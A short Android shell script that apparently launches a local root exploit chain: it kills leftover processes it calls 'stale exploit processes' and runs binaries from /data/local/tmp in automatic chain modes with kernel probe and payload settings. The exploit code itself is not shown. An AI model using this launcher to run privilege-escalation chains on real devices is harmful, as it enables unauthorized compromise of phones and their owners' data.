#!/system/bin/sh
# kill stale exploit processes (precise, by pidof - cannot self-match)
for name in rb3 qroutehold2 rmg-root page-leak-probe rmg-page-leak; do
  for pid in $(pidof $name); do
    [ "$pid" = "$$" ] || kill $pid 2>/dev/null
  done
done
TS=$(date +%Y%m%d-%H%M%S)
LOG=/data/local/tmp/chain-$TS.log
echo "$LOG" > /data/local/tmp/chain-latest.log
if [ "$1" = "chain-auto" ]; then
  /data/local/tmp/rb3 chain-auto /data/local/tmp/qroutehold2 > $LOG 2>&1 &
else
  A536_KS_PROBE=/data/local/tmp/page-leak-probe A536_KS_SKB_PAYLOAD=1 /data/local/tmp/rb3 chain-ks-auto /data/local/tmp/qroutehold2 > $LOG 2>&1 &
fi
echo "LOG=$LOG"
